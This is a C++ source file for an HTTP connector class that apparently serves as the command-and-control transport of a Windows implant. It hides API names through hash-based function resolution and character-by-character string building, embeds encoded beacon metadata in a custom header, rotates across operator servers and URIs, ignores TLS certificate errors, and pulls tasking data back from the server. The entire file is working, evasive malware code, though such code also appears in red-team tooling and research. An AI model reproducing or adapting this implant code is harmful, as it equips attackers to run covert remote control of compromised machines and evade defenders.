#include "ConnectorHTTP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Encoders.h"

BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

int _atoi(const char* str)
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;
	
	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while ( _isdigest(str[index]) ) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10) 
			return (sign == 1) ? INT_MAX : INT_MIN;
		
		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}

DWORD _strlen(const CHAR* str)
{
	int i = 0;
	if (str != nullptr)
		for (; str[i]; i++) {}
	return i;
}

ConnectorHTTP::ConnectorHTTP()
{
	this->functions = static_cast<HTTPFUNC*>(ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC)));
	
	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;

	CHAR wininet_c[12];
	wininet_c[0]  = HdChrA('w');
	wininet_c[1]  = HdChrA('i');
	wininet_c[2]  = HdChrA('n');
	wininet_c[3]  = HdChrA('i');
	wininet_c[4]  = HdChrA('n');
	wininet_c[5]  = HdChrA('e');
	wininet_c[6]  = HdChrA('t');
	wininet_c[7]  = HdChrA('.');
	wininet_c[8]  = HdChrA('d');
	wininet_c[9]  = HdChrA('l');
	wininet_c[10] = HdChrA('l');
	wininet_c[11] = HdChrA(0);

	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
	if (hWininetModule) {
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
	}
}

BOOL ConnectorHTTP::SetConfig(const ProfileHTTP& profile, const BYTE* beat, ULONG beatSize)
{
	LPSTR encBeat = b64_encode(beat, beatSize);

	ULONG enc_beat_length = _strlen(encBeat);
	ULONG param_length    = _strlen((CHAR*) profile.parameter);
	ULONG headers_length  = _strlen((CHAR*) profile.http_headers);

	CHAR* HttpHeaders = static_cast<CHAR*>(this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5));
	memcpy(HttpHeaders, profile.http_headers, headers_length);
	ULONG index = headers_length;
	memcpy(HttpHeaders + index, profile.parameter, param_length);
	index += param_length;
	HttpHeaders[index++] = ':';
	HttpHeaders[index++] = ' ';
	memcpy(HttpHeaders + index, encBeat, enc_beat_length);
	index += enc_beat_length;
	HttpHeaders[index++] = '\r';
	HttpHeaders[index++] = '\n';
	HttpHeaders[index++] = 0;

	memset(encBeat, 0, enc_beat_length);
	this->functions->LocalFree(encBeat);
	encBeat = nullptr;

	this->headers        = HttpHeaders;
	this->server_count   = profile.servers_count;
	this->server_address = (CHAR**) profile.servers;
	this->server_ports   = profile.ports;
	this->ssl            = profile.use_ssl;
	this->http_method    = (CHAR*) profile.http_method;
	this->uris            = (CHAR**) profile.uris;
	this->user_agent     = (CHAR*) profile.user_agent;
	this->ans_size		 = profile.ans_size;
	this->ans_pre_size   = profile.ans_pre_size;

	return TRUE;
}

void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
{
	this->recvSize = 0;
	this->recvData = nullptr;

	ULONG attempt   = 0;
	BOOL  connected = FALSE;
	BOOL  result    = FALSE;
	DWORD context   = 0;

	while ( !connected && attempt < this->server_count) {
		if (!this->hInternet)
			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0 );
		if ( this->hInternet ) {
			DWORD dwError = 0;

			if ( !this->hConnect )
				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );

			if ( this->hConnect )
			{
				CHAR acceptTypes[] = { '*', '/', '*', 0 };
				LPCSTR rgpszAcceptTypes[] = { acceptTypes, nullptr };
				DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
				if (this->ssl)
					flags |= INTERNET_FLAG_SECURE;

				// Choose a random URI to use for request
				srand(time(nullptr));
				size_t idx = rand() % this->uri_count;
				CHAR* uri = this->uris[idx];

				HINTERNET hRequest = this->functions->HttpOpenRequestA( this->hConnect, this->http_method, uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context );
				if (hRequest) {
					if (this->ssl) {
						DWORD dwFlags;
						DWORD dwBuffer = sizeof(DWORD);
						result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
						if (result) {
							dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
						}
					}

					connected = this->functions->HttpSendRequestA(hRequest, this->headers, static_cast<DWORD>(_strlen(headers)), static_cast<LPVOID>(data), static_cast<DWORD>(data_size));
					if (connected) {
						char statusCode[255];
						DWORD statusCodeLenght = 255;
						BOOL httpResult = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);

						if (httpResult && _atoi(statusCode) == 200) {
							DWORD answerSize = 0;
							DWORD dwLengthDataSize = sizeof(DWORD);
							httpResult = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, nullptr);

							if (httpResult) {
								DWORD dwNumberOfBytesAvailable = 0;
								httpResult = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);

								if (httpResult && answerSize > 0) {
									ULONG numberReadedBytes = 0;
									DWORD readedBytes = 0;
									BYTE* buffer = static_cast<BYTE*>(this->functions->LocalAlloc(LPTR, answerSize));

									while (numberReadedBytes < answerSize) {
										httpResult = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
										if (!httpResult || !readedBytes) {
											break;
										}
										numberReadedBytes += readedBytes;
									}
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
								}
							}
							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
								ULONG numberReadedBytes = 0;
								DWORD readedBytes = 0;
								BYTE* buffer = static_cast<BYTE*>(this->functions->LocalAlloc(LPTR, 0));
								DWORD dwNumberOfBytesAvailable = 0;

								while (true) {
									httpResult = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
									if (!httpResult || !dwNumberOfBytesAvailable)
										break;

									buffer = static_cast<BYTE*>(this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE));
									httpResult = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
									if (!httpResult || !readedBytes) {
										break;
									}
									numberReadedBytes += readedBytes;
								}

								if (numberReadedBytes) {
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
								}
								else {
									this->functions->LocalFree(buffer);
								}
							}
						}
					}
					else {
						dwError = this->functions->GetLastError();
					}
					this->functions->InternetCloseHandle(hRequest);
				}
			}

			attempt++;
			if (!connected) {
				if ( dwError == ERROR_INTERNET_CANNOT_CONNECT || dwError == ERROR_INTERNET_TIMEOUT ) {
					if (this->hConnect) {
						this->functions->InternetCloseHandle(this->hConnect);
						this->hConnect = nullptr;
					}
					if (this->hInternet) {
						this->functions->InternetCloseHandle(this->hInternet);
						this->hInternet = nullptr;
					}

					this->functions->InternetSetOptionA(nullptr, INTERNET_OPTION_SETTINGS_CHANGED, nullptr, 0);
					this->functions->InternetSetOptionA(nullptr, INTERNET_OPTION_REFRESH, nullptr, 0);
				}

				this->server_index = (this->server_index + 1) % this->server_count;
				Sleep(5000);
			}
		}
	}
}

BYTE* ConnectorHTTP::RecvData() const
{
	if (this->recvData)
		return this->recvData + this->ans_pre_size;
	else
		return nullptr;
}

int ConnectorHTTP::RecvSize() const
{
	if (this->recvSize < this->ans_size)
		return 0;

	return this->recvSize - this->ans_size;
}

void ConnectorHTTP::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = nullptr;
	}
}

void ConnectorHTTP::CloseConnector()
{
	DWORD l = _strlen(this->headers);
	memset(this->headers, 0, l);
	this->functions->LocalFree(this->headers);
	this->headers = nullptr;

	this->functions->InternetCloseHandle(this->hInternet);
	this->functions->InternetCloseHandle(this->hConnect);
}